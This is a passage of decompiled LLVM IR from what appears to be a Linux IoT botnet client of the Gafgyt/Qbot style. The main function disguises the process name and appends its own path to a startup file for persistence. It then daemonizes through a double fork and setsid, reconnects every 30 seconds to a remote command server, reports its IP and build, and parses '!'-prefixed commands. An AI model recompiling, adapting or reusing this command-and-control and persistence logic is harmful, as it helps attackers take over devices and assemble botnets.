  %v1_11784 = add nuw nsw i32 %storemerge47, 1
  %v7_11794 = icmp slt i32 %v1_11784, 6
  br i1 %v7_11794, label %dec_label_pc_11758, label %dec_label_pc_11798

dec_label_pc_11798:                               ; preds = %dec_label_pc_11758, %dec_label_pc_116e8
  %v1_1179c = call i32 @__libc_close(i32 %v0_11514)
  %v3_117b8.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_117b4

dec_label_pc_117a4:                               ; preds = %dec_label_pc_1160c, %dec_label_pc_115cc, %dec_label_pc_1152c
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_117b4

dec_label_pc_117b4:                               ; preds = %dec_label_pc_11798, %dec_label_pc_117a4
  %v3_117b8 = phi i32 [ %v3_117b8.pre, %dec_label_pc_11798 ], [ 0, %dec_label_pc_117a4 ]
  %v2_117c0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_117c0, i32* @fp, align 4
  ret i32 %v3_117b8

; uselistorder directives
  uselistorder i32 %storemerge47, { 2, 1, 0 }
  uselistorder i32 %v1_1167c, { 1, 0 }
  uselistorder i32 %v2_116c8, { 1, 3, 0, 2 }
  uselistorder i32 %v0_11514, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 3, 5, 2, 0, 1, 4 }
  uselistorder i32 (i32)* @htons, { 11, 10, 9, 8, 7, 6, 5, 1, 4, 3, 2, 0 }
  uselistorder i32 53, { 0, 2, 1 }
  uselistorder label %dec_label_pc_117b4, { 1, 0 }
  uselistorder label %dec_label_pc_11758, { 1, 0 }
  uselistorder label %dec_label_pc_116c0, { 1, 0 }
  uselistorder label %dec_label_pc_11678, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([6 x i8]* @global_var_1c5ac.774 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_117f8 = load i32, i32* @r4, align 4
  store i32 %v3_117f8, i32* %stack_var_-24, align 4
  store i32 71680, i32* %stack_var_-4, align 4
  %v19_117f8 = ptrtoint i32* %stack_var_-24 to i32
  %v2_117fc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_117fc, i32* @fp, align 4
  %v1_11840 = bitcast i8** %argv to i32*
  %v2_11840 = load i32, i32* %v1_11840, align 4
  store i32 %v2_11840, i32* @r4, align 4
  %v2_11858 = load i32, i32* %v1_11840, align 4
  %v1_1185c = inttoptr i32 %v2_11858 to i8*
  %v3_11860 = call i32 @strlen(i8* %v1_1185c)
  %v0_11868 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1c5b4.776 to i32), i32* @r1, align 4
  %v3_11874 = call i32 @strncpy(i32 %v0_11868, i32 ptrtoint (i32* @global_var_1c5b4.776 to i32), i32 %v3_11860)
  store i32 ptrtoint (i32* @global_var_1c5b4.776 to i32), i32* %v1_11840, align 4
  %v0_118b0 = call i32 @prctl()
  %v2_118b8 = call i32 @__GI_time(i32* null)
  store i32 %v2_118b8, i32* @r4, align 4
  %v0_118c0 = call i32 @__libc_getpid()
  %v0_118c8 = load i32, i32* @r4, align 4
  %v2_118c8 = xor i32 %v0_118c8, %v0_118c0
  %v1_118d0 = call i32 @srand(i32 %v2_118c8)
  %v2_118d8 = call i32 @__GI_time(i32* null)
  store i32 %v2_118d8, i32* @r4, align 4
  %v0_118e0 = call i32 @__libc_getpid()
  %v0_118e8 = load i32, i32* @r4, align 4
  %v2_118e8 = xor i32 %v0_118e8, %v0_118e0
  %v1_118f0 = call i32 @init_rand(i32 %v2_118e8)
  store i32 ptrtoint ([19 x i8]* @global_var_1c5b8.778 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_1c5cc.780 to i32), i32* @r1, align 4
  %v3_1190c = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_1c5b8.778 to i32), i32 ptrtoint ([2 x i8]* @global_var_1c5cc.780 to i32))
  %v2_1191c = icmp eq i32 %v3_1190c, 0
  br i1 %v2_1191c, label %dec_label_pc_11924, label %dec_label_pc_11940

dec_label_pc_11924:                               ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_1c5d0.782 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_1c5cc.780 to i32), i32* @r1, align 4
  %v3_11934 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_1c5d0.782 to i32), i32 ptrtoint ([2 x i8]* @global_var_1c5cc.780 to i32))
  br label %dec_label_pc_11940

dec_label_pc_11940:                               ; preds = %entry, %dec_label_pc_11924
  %stack_var_-88.0 = phi i32 [ %v3_11934, %dec_label_pc_11924 ], [ %v3_1190c, %entry ]
  %stack_var_-92.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1c5d0.782, i32 0, i32 0), %dec_label_pc_11924 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1c5b8.778, i32 0, i32 0), %entry ]
  %v2_11944 = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v2_11944, label %dec_label_pc_11adc, label %dec_label_pc_1194c

dec_label_pc_1194c:                               ; preds = %dec_label_pc_11940
  %v2_1195c = load i32, i32* %v1_11840, align 4
  %v1_11960 = inttoptr i32 %v2_1195c to i8*
  %v3_11964 = call i32 @strlen(i8* %v1_11960)
  %v2_11978 = ptrtoint i32* %stack_var_-368 to i32
  %v2_11984 = call i32 @getcwd(i32 %v2_11978, i32 256)
  store i32 ptrtoint (i32* @global_var_1c5e0.784 to i32), i32* @r1, align 4
  %v2_11994 = bitcast i32* %stack_var_-368 to i8*
  %v3_11994 = call i32 @__GI_strcoll(i8* %v2_11994, i32 ptrtoint (i32* @global_var_1c5e0.784 to i32))
  %v2_1199c = icmp eq i32 %v3_11994, 0
  br i1 %v2_1199c, label %dec_label_pc_11ad4, label %dec_label_pc_119b4

dec_label_pc_119a8:                               ; preds = %dec_label_pc_119b4
  %v1_119ac = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_119b4

dec_label_pc_119b4:                               ; preds = %dec_label_pc_1194c, %dec_label_pc_119a8
  %stack_var_-84.0 = phi i32 [ %v1_119ac, %dec_label_pc_119a8 ], [ %v3_11964, %dec_label_pc_1194c ]
  %v2_119c4 = load i32, i32* %v1_11840, align 4
  %v2_119cc = add i32 %v2_119c4, %stack_var_-84.0
  %v1_119d0 = inttoptr i32 %v2_119cc to i8*
  %v2_119d0 = load i8, i8* %v1_119d0, align 1
  %v7_119d4 = icmp eq i8 %v2_119d0, 47
  br i1 %v7_119d4, label %dec_label_pc_119dc, label %dec_label_pc_119a8

dec_label_pc_119dc:                               ; preds = %dec_label_pc_119b4
  %v2_119ec = load i32, i32* %v1_11840, align 4
  %v2_119f4 = add i32 %v2_119ec, %stack_var_-84.0
  %v2_119f8 = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_119f8, i32* @r0, align 4
  %v7_11a0c = call i32 @sprintf(i32 %v2_119f8, i32 ptrtoint ([8 x i8]* @global_var_1c5e4.786 to i32), i32 %v2_11978, i32 %v2_119f4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_11a68 = inttoptr i32 %stack_var_-88.0 to i8*
  %v2_11a1c = ptrtoint i32* %stack_var_-1648 to i32
  %v2_11a48 = bitcast i32* %stack_var_-1648 to i8*
  br label %dec_label_pc_11a64.outer

dec_label_pc_11a14:                               ; preds = %dec_label_pc_11a64
  %v3_11a2c = call i32 @fgets(i32 %v2_11a1c, i32 1024, i32 %stack_var_-88.0)
  %v3_11a48 = call i32 @__GI_strcasecmp(i8* %v2_11a48, i32 %v2_119f8)
  %v2_11a50 = icmp eq i32 %v3_11a48, 0
  br i1 %v2_11a50, label %dec_label_pc_11a58, label %dec_label_pc_11a64

dec_label_pc_11a58:                               ; preds = %dec_label_pc_11a14
  %v1_11a5c = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_11a64.outer

dec_label_pc_11a64.outer:                         ; preds = %dec_label_pc_11a58, %dec_label_pc_119dc
  %stack_var_-80.0.ph = phi i32 [ %v1_11a5c, %dec_label_pc_11a58 ], [ 0, %dec_label_pc_119dc ]
  br label %dec_label_pc_11a64

dec_label_pc_11a64:                               ; preds = %dec_label_pc_11a64.outer, %dec_label_pc_11a14
  %v2_11a68 = call i32 @feof(i8* %v1_11a68)
  %v2_11a70 = icmp eq i32 %v2_11a68, 0
  br i1 %v2_11a70, label %dec_label_pc_11a14, label %dec_label_pc_11a78

dec_label_pc_11a78:                               ; preds = %dec_label_pc_11a64
  %v2_11a7c = icmp eq i32 %stack_var_-80.0.ph, 0
  %v2_11a88 = call i32 @__GI_fclose(i8* %v1_11a68)
  br i1 %v2_11a7c, label %dec_label_pc_11a84, label %dec_label_pc_11adc

dec_label_pc_11a84:                               ; preds = %dec_label_pc_11a78
  %v4_11a8c = ptrtoint i8* %stack_var_-92.0 to i32
  store i32 %v4_11a8c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c5ec.788 to i32), i32* @r1, align 4
  %v3_11a94 = call i32 @__GI_fopen(i32 %v4_11a8c, i32 ptrtoint (i32* @global_var_1c5ec.788 to i32))
  %v2_11aa4 = icmp eq i32 %v3_11a94, 0
  br i1 %v2_11aa4, label %dec_label_pc_11adc, label %dec_label_pc_11aac

dec_label_pc_11aac:                               ; preds = %dec_label_pc_11a84
  %v2_11ab8 = call i32 @__GI_fputs(i32 %v2_119f8, i32 %v3_11a94)
  %v1_11ac0 = inttoptr i32 %v3_11a94 to i8*
  %v2_11ac0 = call i32 @__GI_fclose(i8* %v1_11ac0)
  br label %dec_label_pc_11adc

dec_label_pc_11ad4:                               ; preds = %dec_label_pc_1194c
  %v1_11ad8 = inttoptr i32 %stack_var_-88.0 to i8*
  %v2_11ad8 = call i32 @__GI_fclose(i8* %v1_11ad8)
  br label %dec_label_pc_11adc

dec_label_pc_11adc:                               ; preds = %dec_label_pc_11a78, %dec_label_pc_11a84, %dec_label_pc_11940, %dec_label_pc_11aac, %dec_label_pc_11ad4
  %v0_11adc = call i32 @getOurIP()
  %v0_11ae0 = call i32 @__libc_fork()
  %v2_11af0 = icmp eq i32 %v0_11ae0, 0
  br i1 %v2_11af0, label %dec_label_pc_11b20, label %dec_label_pc_11b5c

dec_label_pc_11b20:                               ; preds = %dec_label_pc_11adc
  %v0_11b20 = call i32 @__libc_fork()
  %v2_11b30 = icmp eq i32 %v0_11b20, 0
  br i1 %v2_11b30, label %dec_label_pc_11b40.thread, label %dec_label_pc_11b4c

dec_label_pc_11b40.thread:                        ; preds = %dec_label_pc_11b20
  br label %dec_label_pc_11b68

dec_label_pc_11b4c:                               ; preds = %dec_label_pc_11b20
  %v1_11b3c = call i32 @__GI_exit(i32 0)
  %v2_11b54 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_1c5f0.790 to i32))
  br label %dec_label_pc_11b68

dec_label_pc_11b5c:                               ; preds = %dec_label_pc_11adc
  %v2_11af8 = ptrtoint i32* %stack_var_-112 to i32
  %v3_11b08 = call i32 @__libc_waitpid(i32 %v0_11ae0, i32 %v2_11af8, i32 0)
  %v1_11b10 = call i32 @__GI_exit(i32 0)
  %v2_11b64 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_1c5f0.790 to i32))
  br label %dec_label_pc_11b68

dec_label_pc_11b68:                               ; preds = %dec_label_pc_11b40.thread, %dec_label_pc_11b4c, %dec_label_pc_11b5c
  %v0_11b68 = call i32 @__GI_setsid()
  %v0_11b70 = call i32 @chdir()
  %v2_11b7c = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_12420 = ptrtoint i32* %stack_var_-5744 to i32
  %v4_12430 = bitcast i32* %stack_var_-5744 to i8*
  %v2_11ec8 = add i32 %v19_117f8, -5720
  %v2_12188 = ptrtoint i32* %stack_var_-1648 to i32
  %v2_12198 = bitcast i32* %stack_var_-1648 to i8*
  %v1_1200c = or i32 %v2_12420, 1
  %v5_12010 = inttoptr i32 %v1_1200c to i8*
  %v2_1202c = or i32 %v2_12420, 2
  %v2_122ec = add i32 %v19_117f8, -600
  br label %dec_label_pc_11b84.outer

dec_label_pc_11b84.outer:                         ; preds = %dec_label_pc_11f64, %dec_label_pc_12410, %dec_label_pc_11b68
  %stack_var_-96.0.ph19 = phi i32 [ 0, %dec_label_pc_11b68 ], [ %stack_var_-96.2.ph, %dec_label_pc_12410 ], [ %v1_11f68, %dec_label_pc_11f64 ]
  %v0_11b8424 = call i32 @initConnection()
  %v2_11b8c26 = icmp eq i32 %v0_11b8424, 0
  br i1 %v2_11b8c26, label %dec_label_pc_11ba0, label %dec_label_pc_11b94

dec_label_pc_11b94:                               ; preds = %dec_label_pc_11b84.outer, %dec_label_pc_11b94
  %v1_11b98 = call i32 @sleep(i32 30)
  %v0_11b84 = call i32 @initConnection()
  %v2_11b8c = icmp eq i32 %v0_11b84, 0
  br i1 %v2_11b8c, label %dec_label_pc_11ba0, label %dec_label_pc_11b94

dec_label_pc_11ba0:                               ; preds = %dec_label_pc_11b94, %dec_label_pc_11b84.outer
  %v2_11ba4 = load i32, i32* @global_var_265cc.54, align 4
  store i32 %v2_11ba4, i32* @r4, align 4
  %v0_11ba8 = call i32 @getBuild()
  store i32 %v0_11ba8, i32* @r5, align 4
  %v2_11bb4 = load i32, i32* @global_var_2c848.477, align 4
  store i32 %v2_11bb4, i32* @r0, align 4
  %v1_11bb8 = inttoptr i32 %v2_11bb4 to i32*
  %v2_11bb8 = call i32 @__GI_inet_ntoa(i32* %v1_11bb8)
  %v0_11bc0 = load i32, i32* @r4, align 4
  %v0_11bc8 = load i32, i32* @r5, align 4
  store i32 %v0_11bc8, i32* @r2, align 4
  %v3_11bcc = call i32 @sockprintf(i32 %v0_11bc0, i32 ptrtoint ([12 x i8]* @global_var_1c600.794 to i32))
  br label %dec_label_pc_12410.outer

dec_label_pc_11bf0:                               ; preds = %dec_label_pc_11ea0, %dec_label_pc_11e4c
  %v3_11bf4 = mul i32 %v3_11e94, 4
  %v2_11c00 = load i32, i32* @global_var_2c854.75, align 4
  %v2_11c04 = add i32 %v2_11c00, %v3_11bf4
  %v1_11c08 = inttoptr i32 %v2_11c04 to i32*
  %v2_11c08 = load i32, i32* %v1_11c08, align 4
  %v3_11c18 = call i32 @__libc_waitpid(i32 %v2_11c08, i32 0, i32 1)
  %tmp111 = icmp slt i32 %v3_11c18, 1
  br i1 %tmp111, label %dec_label_pc_11e40, label %dec_label_pc_11c80

dec_label_pc_11c38:                               ; preds = %dec_label_pc_11cdc, %dec_label_pc_11c80
  %v3_11c3c = mul i32 %v1_11c2c, 4
  %v2_11c48 = load i32, i32* @global_var_2c854.75, align 4
  %v2_11c4c = add i32 %v2_11c48, %v3_11c3c
  %v1_11c50 = add i32 %v2_11c4c, -4
  %v1_11c6c = inttoptr i32 %v2_11c4c to i32*
  %v2_11c6c = load i32, i32* %v1_11c6c, align 4
  %v2_11c70 = inttoptr i32 %v1_11c50 to i32*
  store i32 %v2_11c6c, i32* %v2_11c70, align 4
  br label %dec_label_pc_11c80

dec_label_pc_11c80:                               ; preds = %dec_label_pc_11bf0, %dec_label_pc_11c38
  %v3_11c28.sink = phi i32 [ %v1_11c2c, %dec_label_pc_11c38 ], [ %v3_11e94, %dec_label_pc_11bf0 ]
  %v1_11c2c = add i32 %v3_11c28.sink, 1
  %v2_11c9c = load i32, i32* @global_var_265d4.72, align 4
  %v5_11c9c = load i32, i32* @global_var_265d8.73, align 4
  %tmp112 = icmp ugt i32 %v5_11c9c, %v1_11c2c
  br i1 %tmp112, label %dec_label_pc_11c38, label %dec_label_pc_11cc4

dec_label_pc_11cc4:                               ; preds = %dec_label_pc_11c80
  %v9_11cd4 = icmp eq i32 %v5_11c9c, %v1_11c2c
  br i1 %v9_11cd4, label %dec_label_pc_11cdc, label %dec_label_pc_11cf4

dec_label_pc_11cdc:                               ; preds = %dec_label_pc_11cc4
  %v9_11cec = icmp eq i32 %v2_11c9c, 0
  br i1 %v9_11cec, label %dec_label_pc_11cf4, label %dec_label_pc_11c38

dec_label_pc_11cf4:                               ; preds = %dec_label_pc_11cdc, %dec_label_pc_11cc4
  %v3_11cf8 = mul i32 %v1_11c2c, 4
  %v2_11d04 = load i32, i32* @global_var_2c854.75, align 4
  %v2_11d08 = add i32 %v3_11cf8, -4
  %v1_11d0c = add i32 %v2_11d08, %v2_11d04
  %v2_11d14 = inttoptr i32 %v1_11d0c to i32*
  store i32 0, i32* %v2_11d14, align 4
  %v2_11d1c = load i32, i32* @global_var_265d4.72, align 4
  %v5_11d1c = load i32, i32* @global_var_265d8.73, align 4
  %v2_11d28 = add i32 %v2_11d1c, -1
  %v3_11d28 = icmp ne i32 %v2_11d1c, 0
  %v3_11d2c = add i32 %v5_11d1c, -1
  %v4_11d2c = zext i1 %v3_11d28 to i32
  %v5_11d2c = add i32 %v3_11d2c, %v4_11d2c
  store i32 %v2_11d28, i32* @global_var_265d4.72, align 4
  store i32 %v5_11d2c, i32* @global_var_265d8.73, align 4
  %v3_11d40 = udiv i32 %v2_11d28, 1073741824
  %v3_11d44 = mul i32 %v5_11d2c, 4
  %v2_11d48 = or i32 %v3_11d44, %v3_11d40
  store i32 %v2_11d48, i32* @r4, align 4
  %v3_11d4c = mul i32 %v2_11d28, 4
  %v1_11d50 = add i32 %v3_11d4c, 4
  %v1_11d58 = call i32 @malloc(i32 %v1_11d50)
  br label %dec_label_pc_11db0

dec_label_pc_11d70:                               ; preds = %dec_label_pc_11e0c, %dec_label_pc_11db0
  %v3_11d74 = mul i32 %v3_11e00, 4
  %v2_11d80 = add i32 %v3_11d74, %v1_11d58
  %v2_11d94 = load i32, i32* @global_var_2c854.75, align 4
  %v2_11d98 = add i32 %v2_11d94, %v3_11d74
  %v1_11d9c = inttoptr i32 %v2_11d98 to i32*
  %v2_11d9c = load i32, i32* %v1_11d9c, align 4
  %v2_11da0 = inttoptr i32 %v2_11d80 to i32*
  store i32 %v2_11d9c, i32* %v2_11da0, align 4
  %v1_11da8 = add i32 %v3_11e00, 1
  br label %dec_label_pc_11db0

dec_label_pc_11db0:                               ; preds = %dec_label_pc_11cf4, %dec_label_pc_11d70
  %v3_11e00 = phi i32 [ 0, %dec_label_pc_11cf4 ], [ %v1_11da8, %dec_label_pc_11d70 ]
  %v2_11dcc = load i32, i32* @global_var_265d4.72, align 4
  %v5_11dcc = load i32, i32* @global_var_265d8.73, align 4
  %tmp113 = icmp ugt i32 %v5_11dcc, %v3_11e00
  br i1 %tmp113, label %dec_label_pc_11d70, label %dec_label_pc_11df4

dec_label_pc_11df4:                               ; preds = %dec_label_pc_11db0
  %v9_11e04 = icmp eq i32 %v5_11dcc, %v3_11e00
  br i1 %v9_11e04, label %dec_label_pc_11e0c, label %dec_label_pc_11e24

dec_label_pc_11e0c:                               ; preds = %dec_label_pc_11df4
  %v9_11e1c = icmp eq i32 %v2_11dcc, 0
  br i1 %v9_11e1c, label %dec_label_pc_11e24, label %dec_label_pc_11d70

dec_label_pc_11e24:                               ; preds = %dec_label_pc_11e0c, %dec_label_pc_11df4
  %v2_11e28 = load i32, i32* @global_var_2c854.75, align 4
  store i32 %v2_11e28, i32* @r0, align 4
  %v0_11e30 = call i32 @free()
  store i32 %v1_11d58, i32* @global_var_2c854.75, align 4
  br label %dec_label_pc_11e40

dec_label_pc_11e40:                               ; preds = %dec_label_pc_11bf0, %dec_label_pc_11e24
  %v1_11e44 = add i32 %v3_11e94, 1
  br label %dec_label_pc_11e4c

dec_label_pc_11e4c:                               ; preds = %dec_label_pc_12410, %dec_label_pc_11e40
  %v3_11e94 = phi i32 [ %v1_11e44, %dec_label_pc_11e40 ], [ 0, %dec_label_pc_12410 ]
  %v3_11e54 = ashr i32 %v3_11e94, 31
  %v2_11e64 = load i32, i32* @global_var_265d4.72, align 4
  %v5_11e64 = load i32, i32* @global_var_265d8.73, align 4
  %v3_11e80 = icmp uge i32 %v5_11e64, %v3_11e94
  %v9_11e80 = icmp eq i32 %v5_11e64, %v3_11e94
  %v2_11e84 = xor i1 %v9_11e80, true
  %v3_11e84 = and i1 %v3_11e80, %v2_11e84
  br i1 %v3_11e84, label %dec_label_pc_11bf0, label %dec_label_pc_11e88

dec_label_pc_11e88:                               ; preds = %dec_label_pc_11e4c
  br i1 %v9_11e80, label %dec_label_pc_11ea0, label %dec_label_pc_11eb8

dec_label_pc_11ea0:                               ; preds = %dec_label_pc_11e88
  %tmp = icmp ugt i32 %v2_11e64, %v3_11e54
  br i1 %tmp, label %dec_label_pc_11bf0, label %dec_label_pc_11eb8

dec_label_pc_11eb8:                               ; preds = %dec_label_pc_11e88, %dec_label_pc_11ea0
  %v2_11ecc = add i32 %v2_11ec8, %v5_12430
  %v3_11ed4 = inttoptr i32 %v2_11ecc to i8*
  store i8 0, i8* %v3_11ed4, align 1
  %v2_11ee8 = call i32 @trim(i8* %v4_12430)
  %v4_11f00 = call i32 @strstr(i32 %v2_12420, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1b1ec.56, i32 0, i32 0))
  store i32 %v4_11f00, i32* @r2, align 4
  %v9_11f14 = icmp eq i32 %v4_11f00, %v2_12420
  br i1 %v9_11f14, label %dec_label_pc_11f1c, label %dec_label_pc_11f34

dec_label_pc_11f1c:                               ; preds = %dec_label_pc_11eb8
  %v2_11f20 = load i32, i32* @global_var_265cc.54, align 4
  %v3_11f2c = call i32 @sockprintf(i32 %v2_11f20, i32 ptrtoint ([5 x i8]* @global_var_1c60c.799 to i32))
  br label %dec_label_pc_12410

dec_label_pc_11f34:                               ; preds = %dec_label_pc_11eb8
  %v6_11f48 = call i32 @strstr(i32 %v2_12420, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1c614.801, i32 0, i32 0))
  %v9_11f5c = icmp eq i32 %v6_11f48, %v2_12420
  br i1 %v9_11f5c, label %dec_label_pc_11f64, label %dec_label_pc_11f90

dec_label_pc_11f64:                               ; preds = %dec_label_pc_11f34
  %v1_11f68 = add i32 %stack_var_-96.2.ph, 1
  %v2_11f78 = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_1c618.803 to i32))
  %v7_11f84 = icmp slt i32 %v1_11f68, 21
  br i1 %v7_11f84, label %dec_label_pc_11b84.outer, label %dec_label_pc_11f88

dec_label_pc_11f88:                               ; preds = %dec_label_pc_11f64
  %v1_11f8c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_11f90

dec_label_pc_11f90:                               ; preds = %dec_label_pc_11f34, %dec_label_pc_11f88
  %stack_var_-96.1 = phi i32 [ %v1_11f68, %dec_label_pc_11f88 ], [ %stack_var_-96.2.ph, %dec_label_pc_11f34 ]
  %v2_11fa4 = load i8, i8* %v4_12430, align 4
  %v7_11fa8 = icmp eq i8 %v2_11fa4, 33
  br i1 %v7_11fa8, label %dec_label_pc_11fcc, label %dec_label_pc_12410.outer

dec_label_pc_11fcc:                               ; preds = %dec_label_pc_11f90, %dec_label_pc_11fdc
  %v3_11fb0.sink = phi i8* [ %storemerge8, %dec_label_pc_11fdc ], [ %v4_12430, %dec_label_pc_11f90 ]
  %v4_11fb0 = ptrtoint i8* %v3_11fb0.sink to i32
  %v1_11fb4 = add i32 %v4_11fb0, 1
  %storemerge8 = inttoptr i32 %v1_11fb4 to i8*
  %v2_11fd0 = load i8, i8* %storemerge8, align 1
  %v7_11fd4 = icmp eq i8 %v2_11fd0, 32
  br i1 %v7_11fd4, label %dec_label_pc_11fec, label %dec_label_pc_11fdc

dec_label_pc_11fdc:                               ; preds = %dec_label_pc_11fcc
  %v2_11fe0 = load i8, i8* %storemerge8, align 1
  %v2_11fe4 = icmp eq i8 %v2_11fe0, 0
  br i1 %v2_11fe4, label %dec_label_pc_11fec, label %dec_label_pc_11fcc

dec_label_pc_11fec:                               ; preds = %dec_label_pc_11fdc, %dec_label_pc_11fcc
  %v2_11ff0 = load i8, i8* %storemerge8, align 1
  %v2_11ff4 = icmp eq i8 %v2_11ff0, 0
  br i1 %v2_11ff4, label %dec_label_pc_12410.outer, label %dec_label_pc_11ffc

dec_label_pc_11ffc:                               ; preds = %dec_label_pc_11fec
  store i8 0, i8* %storemerge8, align 1
  %v3_1201c = call i32 @strlen(i8* %v5_12010)
  %v1_12030 = add i32 %v3_1201c, %v2_1202c
  %v5_12034 = inttoptr i32 %v1_12030 to i8*
  %v2_1207c = add i32 %v1_12030, -1
  br label %dec_label_pc_12064

dec_label_pc_1203c:                               ; preds = %dec_label_pc_12090, %dec_label_pc_12064
  %v3_12044 = call i32 @strlen(i8* %v5_12034)
  %v1_12058 = add i32 %v2_1207c, %v3_12044
  %v3_12060 = inttoptr i32 %v1_12058 to i8*
  store i8 0, i8* %v3_12060, align 1
  br label %dec_label_pc_12064

dec_label_pc_12064:                               ; preds = %dec_label_pc_11ffc, %dec_label_pc_1203c
  %v3_1206c = call i32 @strlen(i8* %v5_12034)
  %v1_12080 = add i32 %v3_1206c, %v2_1207c
  %v1_12084 = inttoptr i32 %v1_12080 to i8*
  %v2_12084 = load i8, i8* %v1_12084, align 1
  %v7_12088 = icmp eq i8 %v2_12084, 10
  br i1 %v7_12088, label %dec_label_pc_1203c, label %dec_label_pc_12090

dec_label_pc_12090:                               ; preds = %dec_label_pc_12064
  %v3_12098 = call i32 @strlen(i8* %v5_12034)
  %v1_120ac = add i32 %v3_12098, %v2_1207c
  %v1_120b0 = inttoptr i32 %v1_120ac to i8*
  %v2_120b0 = load i8, i8* %v1_120b0, align 1
  %v7_120b4 = icmp eq i8 %v2_120b0, 13
  br i1 %v7_120b4, label %dec_label_pc_1203c, label %dec_label_pc_120bc

dec_label_pc_120bc:                               ; preds = %dec_label_pc_12090
  %v2_120d828 = load i8, i8* %v5_12034, align 1
  %v7_120dc32 = icmp eq i8 %v2_120d828, 32
  br i1 %v7_120dc32, label %dec_label_pc_120f4, label %dec_label_pc_120e4

dec_label_pc_120c8:                               ; preds = %dec_label_pc_120e4
  %v1_120cc = add i32 %v4_120d434, 1
  %v5_120d0 = inttoptr i32 %v1_120cc to i8*
  %v2_120d8 = load i8, i8* %v5_120d0, align 1
  %v7_120dc = icmp eq i8 %v2_120d8, 32
  br i1 %v7_120dc, label %dec_label_pc_120f4, label %dec_label_pc_120e4

dec_label_pc_120e4:                               ; preds = %dec_label_pc_120bc, %dec_label_pc_120c8
  %v4_120d434 = phi i32 [ %v1_120cc, %dec_label_pc_120c8 ], [ %v1_12030, %dec_label_pc_120bc ]
  %stack_var_-64.033 = phi i8* [ %v5_120d0, %dec_label_pc_120c8 ], [ %v5_12034, %dec_label_pc_120bc ]
  %v2_120e8 = load i8, i8* %stack_var_-64.033, align 1
  %v2_120ec = icmp eq i8 %v2_120e8, 0
  br i1 %v2_120ec, label %dec_label_pc_120f4, label %dec_label_pc_120c8

dec_label_pc_120f4:                               ; preds = %dec_label_pc_120c8, %dec_label_pc_120e4, %dec_label_pc_120bc
  %stack_var_-64.0.lcssa = phi i8* [ %v5_12034, %dec_label_pc_120bc ], [ %v5_120d0, %dec_label_pc_120c8 ], [ %stack_var_-64.033, %dec_label_pc_120e4 ]
  %v4_120d4.lcssa = phi i32 [ %v1_12030, %dec_label_pc_120bc ], [ %v1_120cc, %dec_label_pc_120c8 ], [ %v4_120d434, %dec_label_pc_120e4 ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v1_12104 = add i32 %v4_120d4.lcssa, 1
  %v2_1214839 = load i8, i8* %v5_12034, align 1
  %v2_1214c41 = icmp eq i8 %v2_1214839, 0
  br i1 %v2_1214c41, label %dec_label_pc_12154, label %dec_label_pc_12118

dec_label_pc_12118:                               ; preds = %dec_label_pc_120f4, %dec_label_pc_12118
  %storemerge743 = phi i8* [ %storemerge7, %dec_label_pc_12118 ], [ %v5_12034, %dec_label_pc_120f4 ]
  %storemerge1442 = phi i32 [ %v1_1213c, %dec_label_pc_12118 ], [ %v1_12030, %dec_label_pc_120f4 ]
  %v2_1211c = load i8, i8* %storemerge743, align 1
  %v3_1211c = zext i8 %v2_1211c to i32
  %v1_12124 = call i32 @__GI_toupper(i32 %v3_1211c)
  %v1_12134 = trunc i32 %v1_12124 to i8
  store i8 %v1_12134, i8* %storemerge743, align 1
  %v1_1213c = add i32 %storemerge1442, 1
  %storemerge7 = inttoptr i32 %v1_1213c to i8*
  %v2_12148 = load i8, i8* %storemerge7, align 1
  %v2_1214c = icmp eq i8 %v2_12148, 0
  br i1 %v2_1214c, label %dec_label_pc_12154, label %dec_label_pc_12118

dec_label_pc_12154:                               ; preds = %dec_label_pc_12118, %dec_label_pc_120f4
  store i32 ptrtoint ([3 x i8]* @global_var_1c62c.805 to i32), i32* @r1, align 4
  %v4_12160 = call i32 @__GI_strcoll(i8* %v5_12034, i32 ptrtoint ([3 x i8]* @global_var_1c62c.805 to i32))
  %v2_12168 = icmp eq i32 %v4_12160, 0
  br i1 %v2_12168, label %dec_label_pc_12170, label %dec_label_pc_12278

dec_label_pc_12170:                               ; preds = %dec_label_pc_12154
  %v0_12170 = call i32 @listFork()
  %v2_12178 = icmp eq i32 %v0_12170, 0
  br i1 %v2_12178, label %dec_label_pc_12180, label %dec_label_pc_12410.outer

dec_label_pc_12180:                               ; preds = %dec_label_pc_12170
